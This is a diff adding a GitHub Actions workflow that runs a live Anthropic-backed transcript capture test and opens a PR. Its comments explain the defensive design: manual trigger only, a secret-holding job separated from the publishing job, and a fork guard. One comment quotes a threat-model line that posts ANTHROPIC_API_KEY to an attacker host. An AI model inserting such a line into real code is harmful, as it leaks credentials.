@@ -1,0 +1,214 @@
+name: generate-capture
+
+# WS1 A5a-3 (v020-plan-v3-final.md; plan doc "ws1-a5-eval-plan.md" §4/§7.2):
+# runs cmd/conduit/internal/generate's `//go:build generate_capture` test
+# against a LIVE Anthropic account and, on success, opens a PR with whatever
+# testdata/transcripts/ files it produced. Manually triggered ONLY — see
+# below for why that is not negotiable.
+#
+# # Why `workflow_dispatch` and nothing else
+#
+# This is the only workflow in the repo that carries ANTHROPIC_API_KEY, and a
+# `pull_request` (or `pull_request_target`) trigger with a secret in scope is
+# an exfiltration path by construction: a one-line diff to any file the live
+# job compiles - `http.Post(attacker, "", os.Getenv("ANTHROPIC_API_KEY"))` -
+# exits green, and a reviewer sees a green check on what looks like an
+# unrelated diff. `workflow_dispatch` runs the workflow exactly as it exists
+# on a ref DeVaris chose (normally a merged commit on main) - that is the
+# whole containment, so this file must never grow a `pull_request`,
+# `pull_request_target`, `push`, or `schedule` trigger. (`schedule` is out for
+# a second reason too: A5a-3 is a one-off/occasional corpus capture, not the
+# weekly regression job - that is A5b-2's `generate-eval` workflow, not this
+# one, and it will get its own file.)
+#
+# # The two-job split that matters (plan §7.2)
+#
+# `capture` holds the secret and has `permissions: contents: read` - it
+# cannot push, open a PR, or file an issue no matter what its own steps do.
+# It runs exactly ONE narrowly-scoped go test invocation (never `make test`
+# or `./...` - a broad invocation with a live key in the environment turns
+# every test in the tree into code that can read it) and uploads whatever
+# landed under testdata/transcripts/ as a build artifact.
+#
+# `publish` has no key in its environment at all. It downloads that artifact,
+# and ONLY IF the working tree actually changed, opens a PR - never a push to
+# main. `needs: capture` is the only thing that connects the two jobs; there
+# is no other data path between them.
+#
+# # Redaction is inside the test, not this workflow
+#
+# The go test itself (transcript_capture_test.go's runCapture) writes to a
+# scratch directory, redaction-scans every file (redact.go's
+# ScanTranscriptForSecrets, plan §5), and only copies the batch into
+# testdata/transcripts/ if the scan is clean - all failures abort the WHOLE
+# batch, never a partial promotion. If that scan ever finds something, the
+# `capture` job fails before an artifact is even uploaded, and `publish`
+# never runs.
+
+on:
+  workflow_dispatch:
+    inputs:
+      passes:
+        description: 'Number of full-corpus capture passes to run (median-scored). Plan default is 3 (~$3 at list rates).'
+        required: false
+        default: '3'
+      request_id:
+        description: 'Optional: re-capture only this corpus request id (testdata/eval_requests.yaml). Leave empty for the full 28-request corpus.'
+        required: false
+        default: ''
+
+# No repo-wide default permissions - each job states exactly what it needs,
+# per plan §7.2's split.
+permissions: {}
+
+jobs:
+  capture:
+    # Forks inherit workflow_dispatch too (any collaborator with write access
+    # to a fork can run it) - this guard is not cosmetic, it's what keeps a
+    # fork from ever being able to trigger a run that spends ConduitIO's
+    # budget or exercises its secret.
+    if: github.repository == 'ConduitIO/conduit'
+    name: capture (live, holds the key)
+    runs-on: ubuntu-latest
+    # A GitHub Environment scopes the secret further than a repo-wide one
+    # would: only a run explicitly targeting `generate-eval` can read it, and
+    # the environment can carry its own required-reviewer/branch protection
+    # independent of repo-level branch protection. Configured in repo
+    # settings, not in this file - ANTHROPIC_API_KEY must be added as an
+    # environment secret on `generate-eval`, not a repository secret.
+    environment: generate-eval
+    permissions:
+      contents: read # cannot push, open a PR, or file an issue - see file header
+    timeout-minutes: 35 # go test's own -timeout 30m below, plus setup/checkout headroom
+    outputs:
+      changed: ${{ steps.check-changes.outputs.changed }}
+    steps:
+      - uses: actions/checkout@v7
+
+      - uses: actions/setup-go@v6
+        with:
+          go-version-file: 'go.mod'
+
+      - name: Build the -run pattern
+        id: run-pattern
+        env:
+          REQUEST_ID: ${{ inputs.request_id }}
+        run: |
+          set -euo pipefail
+          if [ -n "$REQUEST_ID" ]; then
+            echo "pattern=TestCaptureTranscripts/${REQUEST_ID}" >> "$GITHUB_OUTPUT"
+          else
+            echo "pattern=TestCaptureTranscripts" >> "$GITHUB_OUTPUT"
+          fi
+
+      # The ONE narrowly-scoped invocation plan §4/§7.2 requires: this exact
+      # test, this exact package, never a wider `./...` while
+      # ANTHROPIC_API_KEY is in the environment. decideCaptureGuard
+      # (transcript_capture_test.go) still refuses without
+      # CONDUIT_GENERATE_CAPTURE=1 and fatals without the key - both are set
+      # here deliberately, since this job IS the sanctioned live run.
+      - name: Run the live capture
+        env:
+          CONDUIT_GENERATE_CAPTURE: '1'
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          CONDUIT_GENERATE_CAPTURE_PASSES: ${{ inputs.passes }}
+          RUN_PATTERN: ${{ steps.run-pattern.outputs.pattern }}
+        run: |
+          set -euo pipefail
+          go test -tags=generate_capture -count=1 -timeout 30m -v \
+            -run "$RUN_PATTERN" \
+            ./cmd/conduit/internal/generate/...
+
+      - name: Check whether any transcript changed
+        id: check-changes
+        run: |
+          set -euo pipefail
+          if git status --porcelain -- cmd/conduit/internal/generate/testdata/transcripts | grep -q .; then
+            echo "changed=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "changed=false" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Upload captured transcripts
+        if: steps.check-changes.outputs.changed == 'true'
+        uses: actions/upload-artifact@v4
+        with:
+          name: generate-transcripts
+          path: cmd/conduit/internal/generate/testdata/transcripts
+          retention-days: 14
+          if-no-files-found: error
+
+  publish:
+    if: github.repository == 'ConduitIO/conduit' && needs.capture.outputs.changed == 'true'
+    needs: capture
+    name: publish (opens a PR, no key)
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write # to push the capture branch this job itself creates
+      pull-requests: write # to open the PR
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v7
+
+      - name: Download captured transcripts
+        uses: actions/download-artifact@v4
+        with:
+          name: generate-transcripts
+          path: cmd/conduit/internal/generate/testdata/transcripts
+
+      - name: Summarize the manifest
+        id: summary
+        run: |
+          set -euo pipefail
+          manifest=$(find cmd/conduit/internal/generate/testdata/transcripts -maxdepth 2 -name manifest.yaml | head -1)
+          if [ -z "$manifest" ]; then
+            echo "summary=no manifest.yaml in this run's artifact (a scoped --request_id run does not write one)" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          {
+            echo "summary<<EOF"
+            grep -E '^(provider|model|requestCount|passes|medianValidatePassRate|medianSemanticMatchRate|totalTokensUsed|estimatedCostUSD|corpusCommitSha):' "$manifest" || true
+            echo "EOF"
+          } >> "$GITHUB_OUTPUT"
+
+      - name: Open the PR
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          RUN_ID: ${{ github.run_id }}
+          SUMMARY: ${{ steps.summary.outputs.summary }}
+          REQUEST_ID: ${{ inputs.request_id }}
+        run: |
+          set -euo pipefail
+          branch="generate-capture/$(date -u +%Y%m%d)-run${RUN_ID}"
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+          git checkout -b "$branch"
+          git add cmd/conduit/internal/generate/testdata/transcripts
+          if [ -n "$REQUEST_ID" ]; then
+            title="chore(generate): re-capture transcript for ${REQUEST_ID}"
+          else
+            title="chore(generate): capture provider transcripts (run ${RUN_ID})"
+          fi
+          git commit -m "$title"$'\n\n'"Roadmap: v0.20 WS1 (\`conduit generate\`), slice A5a-3."
+          git push origin "$branch"
+          gh pr create \
+            --title "$title" \
+            --body "$(cat <<EOF
+          Opened by \`.github/workflows/generate-capture.yml\` (run ${RUN_ID}), never pushed to main.
+
+          ## Manifest
+
+          \`\`\`
+          ${SUMMARY}
+          \`\`\`
+
+          ## Review checklist
+
+          - [ ] \`TestTranscripts_CarryNoSecretMaterial\` is green on this PR (untagged, runs on every PR already)
+          - [ ] Manifest numbers look sane against the last capture (see \`docs/generate-benchmark.md\` once A5b lands)
+          - [ ] Diff is scoped to \`cmd/conduit/internal/generate/testdata/transcripts/\` only
+
+          🤖 Generated by the \`generate-capture\` workflow, live-capture job holds the key and cannot write to the
+          repo (\`contents: read\`) - this job has no key and only opens the PR.
+          EOF
+          )"
